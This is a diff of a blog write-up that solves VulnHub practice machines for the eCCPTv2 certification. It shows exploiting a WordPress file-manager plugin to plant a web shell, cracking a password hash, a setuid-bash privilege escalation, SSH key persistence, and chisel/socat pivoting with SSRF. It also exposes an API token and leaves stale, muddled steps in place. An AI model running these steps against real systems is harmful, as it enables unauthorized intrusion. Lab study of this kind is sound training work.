@@ -1,8 +1,8 @@
 ---
 layout: single
 title: '<span class="vulnhub">eCCptV2 Simulation- /VulnHub</span>'
-excerpt: "Synfonos3, is a machine from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like this."
-date: 2023-04-05
+excerpt: "these are a machines from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like this."
+date: 2023-04-22
 categories:
   - certification
 tags:  
@@ -25,14 +25,14 @@ toc_sticky: true
 show_time: true
 ---
 
-Synfonos3, is a machine from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like these cluster, another very strong point to mention is that works well doings these machine as pivoting machines
+Aragog,Nagini,Fawkes,Dumbledore-PC,matrix1, BrainPan are a machines from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like these cluster, another very strong point to mention is that works well doings these machine as pivoting machines if you don't know how to set the environment for the certification click [here](https://github.com/Zeekk3n/eccptv2-environment/blob/main/README.md)
 
 
 **We will see all this from the perspective and methodology of a penetration test.**
 
-- Links to the machines: [Synfonos3](https://www.vulnhub.com/entry/symfonos-31,332/)
+- Links to the machines: [Aragog](https://www.vulnhub.com/entry/symfonos-31,332/),[nagini](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/), [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/),[Dumbledore](https://www.mediafire.com/file/sluu2e0p0qtb9xx/Dumbledore-PC.rar/file), [matrix](https://www.vulnhub.com/entry/matrix-1,259/),[BrainPan](https://www.vulnhub.com/entry/brainpan-1,51/) 
 - Difficulty assigned by Vulnhub: Medium
-- The IP of the machine in my case will be: 192.168.100.65 (You will have a different ip so change it for all steps)
+- The IP of the machine in my case will be: 192.168.100.65 (You will have a different ip so change it for all steps).
 
 Let's get them!
 
@@ -97,7 +97,7 @@ the meaning of each parameter is.:
 - ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
 - ```-v``` : (verbose) To see which ports appear as we go along.
 - ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.
-output
+output.
 
 ```php
 ❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.100.65 -oG allports
@@ -134,7 +134,7 @@ At this point we know that there are 2 open ports: 80 (HTTP) and 22 (SSH), seein
 ```
 
 
-Where :
+Where.:
 
 - ```-sV``` : If possible, it will show the version of the service running on each port.
 - ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
@@ -164,7 +164,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
 ```
 
-To find out what we are dealing with, we will run **WhatWeb** in order to find the codename as well
+To find out what we are dealing with, we will run **WhatWeb** in order to find the codename as well.
 
 ```bash
 http://192.168.100.65 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.100.65]
@@ -172,7 +172,7 @@ http://192.168.100.65 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer
 
 seems that does not give us a lot of information.
 
-So let's visit the web the port 
+So let's visit the the port 80 which is a page.
 
 
 After testing each of the attacks SSRF,SQLI,PATHtraversal I did not find anything relevant, on the other hand we are able to search for possible routes using gobuster for example
@@ -210,7 +210,7 @@ let's enumerate it via wpSCAN in order to find vulneral plugins and potential vi
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
 ```
 
-according with the output we don't find anything, so let's register and try again with the api token  
+according with the output we don't find anything, so let's register and try again with the api token.
 
 ```bash
  wpscan --url http://192.168.100.65/blog/ --enumerate u,vp --plugins-detection aggressive --api-token=yocj0asWxCFcZvF1sdI9ocg10i7x5sDnwtZsXYhvIMuVszR23h2VIF1A
@@ -253,7 +253,7 @@ seems that we found some vulnerabilyties with the api token, that the page of WS
 ```bash
 wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
  ```
- something to consider is that after we analizy the code in the line 72 according with it the script is calling "payload.php" so we must to create before we execute this script
+ something to consider is that after we analizy the code in the line 72 according with it the script is calling "payload.php" so we must to create before we execute this script.
  
  ```bash
  nvim payload.php
@@ -267,7 +267,7 @@ wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
 ───────┴──────
 
  ```
- after we save it we must execute it using python3, example
+ after we save it we must execute it using python3, example.
  
  ```bash
 python3 2020-wp-file-manager-v67.py http://192.168.100.65/blog
@@ -279,15 +279,15 @@ Success!?
 http://192.168.100.65/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php 
  ```
  now we have to copy the output called "http://192.168.100.65/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php " an delete 1 blog
- example
+ example.
   ```bash
 http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php 
  ```
- now we have to use the page with the url before insert commands, in order to use the payload that we injected for example
+ now we have to use the page with the url before insert commands, in order to use the payload that we injected for example.
   ```bash
 ❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?"   
  ```
- now we can insert commands
+ now we can insert commands.
 ```bash
 ❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami"
 <pre>www-data
@@ -380,7 +380,7 @@ and seems that all the wordpress is in /usr/share/wordpress so let's get into it
 } elseif (file_exists("/etc/wordpress/config-default.php
 ```
 
-according with this file all crendials are in file default 
+according with this file all crendials are in file default.
 
 ```bash
 www-data@Aragog:/usr/share/wordpress$  cat /etc/wordpress/config-default.php
@@ -398,8 +398,8 @@ Enter password: mySecr3tPass
 
 ```
 
-now we have to search for Dbs
-example
+now we have to search for Dbs.
+example.
 
 ```php
  MariaDB [(none)]> show databases;  
@@ -411,7 +411,7 @@ example
 | performance_schema |
 | wordpress          |
 ```
-now for tables
+now for tables.
 
 ```php
 use wordpress  
@@ -438,7 +438,7 @@ MariaDB [wordpress]> show tables;
 | wp_wpfm_backup        |
 +-----------------------+
 ```
-now for columns
+now for columns.
 
 ```php
 MariaDB [wordpress]> describe wp_users;
@@ -460,7 +460,7 @@ MariaDB [wordpress]> describe wp_users;
 
 ```
 
-now we will search for the information of the user .
+now we will search for the information of the user.
 ```bash
 select * from wp_users;
 +----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
@@ -471,7 +471,7 @@ select * from wp_users;
 1 row in set (0.001 sec)
 
 ```
-now we will execute a brute force attack in order to figure out what's the password for hash "$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc." using john and seclist
+now we will execute a brute force attack in order to figure out what's the password for hash "$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc." using john and seclist.
 ```bash
 ❯ john -w:rockyou.txt hash
 Using default input encoding: UTF-8
@@ -484,13 +484,13 @@ password123      (?)
 Use the "--show --format=phpass" options to display all of the cracked passwords reliably
 Session completed
 ```
-according with john the password is password123
-now we have to figure out who is the owner of this password we have 2 potentials options 
+according with john the password is password123.
+now we have to figure out who is the owner of this password we have 2 potentials options.
 ```bash
 www-data@Aragog:/home$ ls
 ginny  hagrid98
 ```
-so how we saw the port 22 is open so 
+so how we saw the port 22 is open so.
 ```bash
 ❯ ssh ginny@192.168.100.65
 The authenticity of host '192.168.100.65 (192.168.100.65)' can't be established.
@@ -513,7 +513,7 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 hagrid98@Aragog:~$ 
 ```
-whoami 
+that is how we gained access to this user called hagrid.
 ```bash
 hagrid98@Aragog:~$ whoami
 hagrid98
@@ -523,7 +523,7 @@ first flag
 ❯ echo "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d; echo
 1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
 ```
-using hagrid98 let's find SUID binaries 
+using hagrid98 user let's find SUID binaries.
 ```bash
 hagrid98@Aragog:/$ find \-perm -4000 -user root 2>dev/null
 ./usr/bin/newgrp
@@ -546,13 +546,13 @@ hagrid98@Aragog:/$ find \-user hagrid98 2>/dev/null
 ./opt/.backup.sh
 
 ```
-and we found something let's reasearch it in order to find vulnerabilities 
+and we found something let's reasearch it in order to find vulnerabilities.
 
 ```bash
 hagrid98@Aragog:/$ ls -l ./opt/.backup.sh 
 -rwxr-xr-x 1 hagrid98 hagrid98 81 Apr  1  2021 ./opt/.backup.sh
 ```
-seems that we can take an adventage of it so let's get it 
+seems that we can take an adventage of it so let's get it.
 
 ```bash
 #!/bin/bash
@@ -581,13 +581,13 @@ cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
 chmod u+s /bin/bash
 
 ```
-now if everything works we just have to monitoring the bash using watch command 
+now if everything works we just have to monitoring the bash using watch command.
 
 ```bash
 hagrid98@Aragog:/$ watch -n 1 ls -l /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
 ```
-and now the permission changed rwsr, we just have to change the privilages of the bash using bash -p
+and now the permission changed rwsr, we just have to change the privilages of the bash using bash -p.
 .
 ```bash
 hagrid98@Aragog:/$ bash -p
@@ -629,19 +629,18 @@ bash-5.0#
 - ```-cerberus@symfonos3:/tmp$ id
 uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)```
 
-another flag  
+another flag.
 - ```MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU= ```
-- decodificared "2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre"
+- decodificated "2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre"
 
 
-now let's find another machines because if we are able to watch another interface it's because theres other machines in to this environment 
+now let's find another machines because if we are able to watch another interface it's because theres other machines in to this environment.
 
 ```bash
 bash-5.0# hostname -I
 10.10.0.136 192.168.100.65 
 bash-5.0# 
 ```
-
 
 
 
@@ -692,12 +691,73 @@ rtt min/avg/max/mdev = 0.270/0.384/0.567/0.130 ms
 - ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.
 
 SSH keys
+how we found another machine that we are able to do pivoting let's make persistance with ssh keys in case if we need to bring back again to hagridMachine
 
-```
-keys
+
 ```bash
-ssh key
+we need to create a ssh key pb/priv with ssh-keygen + enter +enter +enter
+ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:EUYJiyL0tlLt5yjqlNHxbyKYX/kfkmmeQrzbDlmdvyE root@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+| .    .o+.       |
+|. . .. o..       |
+|. .=... .        |
+| .+.=   ...      |
+| o o.o oSo       |
+|  *  oO o .      |
+| = o.B.O E o     |
+|. o +oO o o o    |
+|.o . .+*.. .     |
++----[SHA256]-----+
 ```
+now we have to check the output
+```bash
+cat ~/.ssh/id_rsa.pub
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /root/.ssh/id_rsa.pub
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx3N+ZKQLTQIgqGkcpWZcxbt6j4/qTj4dmyyDtu6w7zyMVKsAFqJj6EGEqWYd8tysgM3O7ds7EAnRAwey1w6oEpQ0YmzVvWE1Ose/FuxSu8UVTZ8Kq/dwzIuANcrNYpS6TAvx0VsCnsdNUNLqhcCXWu3cX/7ocUUczHaO/z/Q2Nql4AUL1isOg/4Y/NpVaQG26y4tmB55
+       │ COIVXBnikNltrxTeym2/9WtHhB2ev0UuJZstU7eFXwqfD15SBv31IezQGY6MaXUSdEjORWVb6vDZLcstK22IqrLGCuyn0GquKCdg8JWx8mxQYGrxz9jF2RGm/tsiVi+9rXaFDVQhx2hhRK000OWhD8YtbEGXTi5jYJgzSXSjMuz4u62bk+lVgXS1S2Fnauz4f1vGFJHacxUPQY9q0Yswe4n6t0soNDB3Dm6SDebRDXLF6x0
+       │ I50SzsBWDdmcbEM1wHZ0xOfDO2L/M2ILOCnWqg0WNkS5nQ5IDeXqoFqcZVFsP+RmNht3uAjgU= root@parrot
+```
+
+in order to copy + paste and remove the spaces between each line
+
+```bash
+❯ cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
+```
+now we have to paste it in /root/.ssh on (hagrid98) machine 
+
+```bash
+bash-5.0# cd /root/.ssh/
+bash-5.0# ls
+bash-5.0# nano authorized_keys
+```
+paste it 
+and let's verify if it works
+from our machine let's use ssh
+```bash
+❯ ssh root@192.168.100.65
+Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@Aragog:~# 
+```
+
+
 now we have to use chisel in order to create a tunneling to use the tools that we have in our own machine 
 such as Nmap and to scan ports such as 80 and 22 that we saw them open 
 
@@ -710,7 +770,7 @@ save it in the directory download and share it using a server with python3
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-from the machine that we obtained root before we have to wget it and give it permissions of execution 
+from the machine that we obtained root before we have to wget it and give it permissions of execution.
 ```bash
 bash-5.0# wget 192.168.100.53:80/chisel.sh
 --2023-04-21 22:04:56--  http://192.168.100.53/chisel.sh
@@ -778,8 +838,7 @@ we must use -sT and -Pn parameters because we are using a tunneling type socks 5
 
 we saw port 22 and 80 so we have to enumerate that service on port 80 but we are not able to see it unless we use foxyProxy and add it as our local host 
 
-example 
-<a href="/assets/images/eccptv2/1.png"><img src="/assets/images/eccptv2/1.png" alt="eccptv2"></a>
+example here's an example of how to set [foxyProxy](https://github.com/Zeekk3n/FoxyProxy) in case, if you don't know how to set it
 
 now how we can enumerate that port 80 we will search for possible routes using go buster 
 
@@ -825,23 +884,21 @@ let's enumerate them.
 
 
 
-so we have to use a tool in order to enumerate a http3 service http3 usually wokr on 443 port 
+so we have to use a tool in order to enumerate a http3 service http3 usually work on 443 port 
 http://10.10.0.137/joomla  
 
-tool
-
-
-
+installation
+1
 ```bash
  git clone --recursive https://github.com/cloudflare/quiche
 ``````
 
-tool
+2
 
 ```bash
 curl https://sh.rustup.rs -sSf | sh
 ```
-tool
+3
 
 ```bash
 1) Proceed with installation (default)
@@ -849,46 +906,54 @@ tool
 3) Cancel installation
 >1
 ```
-tool
+4
 ```bash
 source "$HOME/.cargo/env"
 ```
-tool
+
+5
+
 ```bash
 ❯ rustup update
 ```
-tool
+6
 
 tool
 ```bash
 ❯ rustup update
 ```
-tool
+last steps
 
 ```bash
 ❯ cargo build --examples
 ```
-tool
+testing the cargo 
+
+1
+```bash
+❯ cargo tests
+```
+2
 
 ```bash
 ❯ cargo tests
 ```
-tool
+how to use it, once we set it 
 
-```bash
-❯ cargo tests
-```
-usage
+we have to bring another ports in order to scan it, which is the 443 port for http3
 
 ```bash
 bash-5.0$ ./chisel.sh client 192.168.100.53:1234 R:socks R:443:10.10.0.137:443/udp
 ```
-usage 
+first of all we need to use the binary called http3-client here's is the path
+cd quiche/target/debug/examples
+
+now execute it using the tool for http3
 
 ```bash
 ❯ ./http3-client https://127.0.0.1
 ```
-usage 
+output
 ```bash
 ❯ ./http3-client https://127.0.0.1
 <html>
@@ -909,28 +974,109 @@ usage
 	</body>
 </html>
 ```
-usage 
+seems that we found a route for the machine 10.10.0.137
 ```bash
-❯ cargo tests
+let's find possible CVE's or pluglins for that route
 ```
 usage 
+remember to turn on the foxyproxy in order to dig that page
 
-```bash
-❯ cargo tests
+```php
+<html>
+<head>
+	<title>Resource Fetching Page</title>
+	<meta charset="utf-8">
+</head>
+<body>
+	<center><h1>Welcome to Internal Network Resource Fetching Page</h1></center>
+	<br><br>
+
+	<form action="/internalResourceFeTcher.php" method="GET">
+	<center><input type="text" name="url" value="" id='url'>
+	<input type="submit" value="Fetch"></center>
+	</form>
+</body>
+
+<html>
+<body>
+<img src="harry_potter_2.jpg" style='height: 100%; width: 100%; '>
+</body>
+</html>
+
 ```
 
-let's enumerate them.
-[note.txt](http://10.10.0.137/joomla)
+that page is using the parameter ```GET``` so it has a vulnerability of Server side request forgery 
+using the search bar let's try it 
+
+first of all we need to use 2 connections the ssh port that we made using the key gen and the reverse shell that we made for hagri98 
+
+on our tunneling made with sshpor22 we have to stay using this command 
 
 ```bash
-bash-4.2# whoami
-root
+root@Aragog:/dev/shm# ./chisel.sh client 192.168.100.53:1324 R:socks
+```
+and for the reverse shell we will use socat in order to download we just have to get them from github, example 
+
+```bash
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
 ```
 
+then just click in download tab
+
+and share it with python3 
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.100.65 - - [23/Apr/2023 16:12:06] "GET /socat HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+```
+get it from the reverse shell 
+
+```
+wget 192.168.100.53:80/socat
+```
+give it execution permissions
+
+```
+chmod +x socat
+```
+
+execute it from the reverse shell
+
+```
+bash-5.0# ./socat TCP-LISTEN:4343,fork TCP:192.168.100.53:80 
+```
+Where.:
+
+- ```-TCP-LISTEN``` : stay listen at all the flow of information that comes from port 4343
+- ```-4343``` : that comes from port 4343.
+- ```-fork```: execute a redireccion of all that information that comes from port 4343.
+- ```-TCP:192.168.100.53:80```: send it to 192.168.100.53 via tcp to  port 80
+
+saying this now we have to listing at port 80 in order to get all fork of information that comes from socat
+
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)...
+```
+
+going back to the port 80 of 10.10.0.137
+we have to request to the local host the information from our machine which is listining at 192.168.100.53:80 (remeber that this is possible because it's 
+is vulnerable to ssrf)
+
+in the search bar we have to search this 
+
+```bash
+http://10.10.0.128:4343
+```
+and seems that it does not work because, it's not interpreting php code 
+
+let's check joomla service that we found with gobuzzter
 
 
 
-and here's the flag.
 
 ```bash
 hades@symfonos3: cd /root
